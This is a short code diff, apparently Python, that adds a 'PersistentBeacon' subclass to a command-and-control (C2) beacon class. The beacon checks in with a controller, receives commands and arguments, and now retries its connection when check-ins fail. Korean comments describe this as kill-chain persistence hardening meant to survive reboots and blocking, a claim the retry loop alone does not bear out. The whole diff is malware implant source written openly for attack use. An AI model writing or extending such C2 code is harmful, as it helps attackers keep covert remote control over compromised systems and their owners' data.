@@ -75,3 +75,23 @@ class C2Beacon:
             _send_json(s, {"agent": self.agent_id, "status": status})
             resp = _recv_json(s)
         return Tasking(resp.get("command", "noop"), resp.get("args", {}))
+
+
+class PersistentBeacon(C2Beacon):
+    """지속 C2 — 접속 실패 시 재접속 재시도(킬체인 6단계 경화). 재부팅/차단 생존."""
+
+    def run(self, rounds=3, retries=2, timeout=2.0):
+        """rounds 회 비콘. 각 회 실패 시 retries 만큼 재접속. 반환: 수신 태스킹 목록."""
+        taskings = []
+        for _ in range(rounds):
+            last_err = None
+            for _ in range(retries + 1):
+                try:
+                    taskings.append(self.beacon(timeout=timeout))
+                    last_err = None
+                    break
+                except OSError as e:
+                    last_err = e
+            if last_err is not None:
+                break                       # 재시도 소진 — C2 상실
+        return taskings
